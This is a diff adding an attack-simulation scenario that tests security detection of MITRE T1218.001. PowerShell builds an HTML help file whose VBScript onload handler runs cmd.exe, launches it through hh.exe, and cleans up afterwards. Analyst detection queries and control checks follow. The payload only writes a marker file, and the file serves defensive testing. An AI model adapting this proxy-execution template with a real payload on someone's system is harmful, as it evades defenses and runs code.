@@ -1,0 +1,131 @@
+id: T1218.001_compiled_html_file
+name: "System Binary Proxy Execution — Compiled HTML File"
+mitre_technique: "T1218.001"
+mitre_tactic: "defense_evasion"
+description: >
+  Adversaries use hh.exe (Microsoft HTML Help) to execute malicious code embedded in
+  .chm (Compiled HTML Help) files. CHM files can contain ActiveX, VBScript, and
+  JavaScript that executes when the file is opened. hh.exe is a signed Windows binary
+  and its execution is often less scrutinized than powershell.exe. CHM-based payload
+  delivery is a classic initial access technique still used by multiple threat actors.
+  This scenario creates a benign CHM with an embedded script and executes it via hh.exe.
+author: stanleytobias
+created: "2026-01-01"
+platform: windows
+references:
+  - https://attack.mitre.org/techniques/T1218/001/
+
+steps:
+  - step: 1
+    type: marker
+    description: "Pre-execution context"
+    message: "Starting T1218.001 — hh.exe CHM proxy execution simulation"
+
+  - step: 2
+    type: exec_powershell
+    description: "Create a benign HHC project and CHM with embedded VBScript"
+    command: |
+      $chmDir  = "$env:TEMP\PAS_T1218_001"
+      $htmlSrc = "$chmDir\payload.htm"
+      $hhpFile = "$chmDir\project.hhp"
+      $chmOut  = "$env:TEMP\PAS_T1218_001.chm"
+
+      New-Item -ItemType Directory $chmDir -Force | Out-Null
+
+      # HTML with embedded script that fires on load
+      Set-Content $htmlSrc @'
+<html>
+<head>
+<object id="oShell" classid="clsid:52a2aaae-085d-4187-97ea-8c30db990436"
+        width=0 height=0></object>
+<script language="VBScript">
+Sub window_onload()
+    Dim oSh : Set oSh = CreateObject("WScript.Shell")
+    oSh.Run "cmd.exe /c echo PAS-T1218.001-CHM > %TEMP%\PAS_T1218_001_fired.txt", 0, True
+End Sub
+</script>
+</head>
+<body><p>PAS CHM Test</p></body>
+</html>
+'@
+
+      # HHP project file
+      Set-Content $hhpFile @"
+[OPTIONS]
+Compiled file=$chmOut
+Default topic=payload.htm
+
+[FILES]
+payload.htm
+"@
+      Write-Host "[PAS] CHM source files created in: $chmDir"
+      Write-Host "[PAS] HTML payload: $htmlSrc"
+
+      # Try to compile with hhc.exe if available
+      $hhc = Get-Command hhc.exe -ErrorAction SilentlyContinue
+      if ($hhc) {
+          & hhc.exe $hhpFile 2>&1 | Out-Null
+          Write-Host "[PAS] CHM compiled: $chmOut"
+      } else {
+          Write-Host "[PAS] hhc.exe not found — skipping compile step"
+          Write-Host "[PAS] hh.exe can also open raw .htm files directly"
+      }
+
+  - step: 3
+    type: exec_powershell
+    description: "Execute via hh.exe — direct HTML execution (no CHM compile needed)"
+    command: |
+      $htmlSrc = "$env:TEMP\PAS_T1218_001\payload.htm"
+      $chmOut  = "$env:TEMP\PAS_T1218_001.chm"
+
+      if (Test-Path $chmOut) {
+          Write-Host "[PAS] Executing compiled CHM via hh.exe:"
+          Start-Process hh.exe -ArgumentList $chmOut -Wait
+      } else {
+          Write-Host "[PAS] Executing HTML via hh.exe (CHM not compiled):"
+          Start-Process hh.exe -ArgumentList $htmlSrc
+          Start-Sleep -Seconds 3
+          Stop-Process -Name hh -ErrorAction SilentlyContinue
+      }
+
+      if (Test-Path "$env:TEMP\PAS_T1218_001_fired.txt") {
+          Write-Host "[PAS] CHM script executed — hh.exe spawned cmd.exe"
+      } else {
+          Write-Host "[PAS] Script did not fire (expected in hardened environments)"
+      }
+
+  - step: 4
+    type: sleep
+    description: "Allow telemetry to flush"
+    seconds: 5
+
+  - step: 5
+    type: marker
+    description: "Post-execution prompt"
+    message: "Check SIEM — hh.exe execution and any cmd.exe/wscript.exe child processes"
+
+cleanup:
+  - step: 1
+    type: exec_powershell
+    description: "Remove CHM test files"
+    command: |
+      Stop-Process -Name hh -Force -ErrorAction SilentlyContinue
+      Remove-Item "$env:TEMP\PAS_T1218_001"       -Recurse -Force -ErrorAction SilentlyContinue
+      Remove-Item "$env:TEMP\PAS_T1218_001.chm"   -Force -ErrorAction SilentlyContinue
+      Remove-Item "$env:TEMP\PAS_T1218_001_fired.txt" -Force -ErrorAction SilentlyContinue
+      Write-Host "[PAS][Cleanup] CHM files removed"
+
+  - step: 2
+    type: marker
+    description: "Cleanup complete"
+    message: "T1218.001 cleanup complete"
+
+analyst_checklist:
+  - "Process event: hh.exe executed with .chm or .htm argument"
+  - "Process event: hh.exe spawning cmd.exe or wscript.exe as child — high-priority alert"
+  - "Sentinel: DeviceProcessEvents | where FileName == 'hh.exe' and ProcessCommandLine contains '.chm'"
+  - "Sentinel: DeviceProcessEvents | where InitiatingProcessFileName == 'hh.exe' and FileName in ('cmd.exe','wscript.exe','powershell.exe')"
+  - "MDE alert: 'HTML help file executing suspicious script' or 'hh.exe spawning child process'"
+  - "CONTROL CHECK: hh.exe spawning any child process should be an immediate high-priority alert"
+  - "CONTROL CHECK: Block .chm file delivery via email — Defender for Office 365 blocks CHM by default in some policies"
+  - "CONTROL CHECK: ASR rule 'Block Office apps from creating child processes' does not cover hh.exe — check for a separate hh.exe parent rule"
